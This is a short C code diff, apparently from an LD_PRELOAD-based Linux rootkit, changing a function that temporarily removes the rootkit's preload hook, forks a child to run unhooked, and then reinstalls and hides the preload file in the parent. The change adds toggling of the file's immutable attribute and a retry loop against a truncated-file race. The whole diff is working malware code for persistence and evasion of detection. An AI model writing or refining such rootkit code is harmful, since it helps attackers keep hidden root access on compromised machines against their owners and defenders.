@@ -1,14 +1,14 @@
 /* uninstall. continue execution in child. reinstall in parent. */
 int remove_self(void){
-    if(notuser(0))
-        return VINVALID_PERM;
+    if(notuser(0)) return VINVALID_PERM;
 
+    char *preloadpath = OLD_PRELOAD;
 #ifdef PATCH_DYNAMIC_LINKER
-    ldpatch(PRELOAD_FILE, OLD_PRELOAD);
-    rm(PRELOAD_FILE);
-#else
-    rm(OLD_PRELOAD);
+    preloadpath = PRELOAD_FILE;
+    ldpatch(preloadpath, OLD_PRELOAD);
 #endif
+    doiapath(preloadpath, 0);
+    rm(preloadpath);
 #ifdef ROOTKIT_BASHRC
     rm(BASHRC_PATH);
     rm(BASHRC_PATH);
@@ -17,15 +17,21 @@ int remove_self(void){
     pid_t pid = fork();
     if(pid < 0) return VFORK_ERR;
     else if(pid == 0) return VFORK_SUC;
-    wait(NULL);
+    int status;
+    waitpid(pid, &status, 0);
 
-    char *preloadpath = OLD_PRELOAD;
+    if(status == 0){
 #ifdef PATCH_DYNAMIC_LINKER
-    preloadpath = PRELOAD_FILE;
-    ldpatch(OLD_PRELOAD, preloadpath);
+        ldpatch(OLD_PRELOAD, preloadpath);
 #endif
-    reinstall(preloadpath, INSTALL_DIR, BDVLSO);
-    hide_path(preloadpath);
+        reinstall(preloadpath, NULL, NULL);
+        hide_path(preloadpath);
+    
+        // prevent race codition. (truncated file)
+        while(!doiapath(preloadpath, 1))
+            reinstall(preloadpath, NULL, NULL);
+    }
+
     return VEVADE_DONE;
 }
 
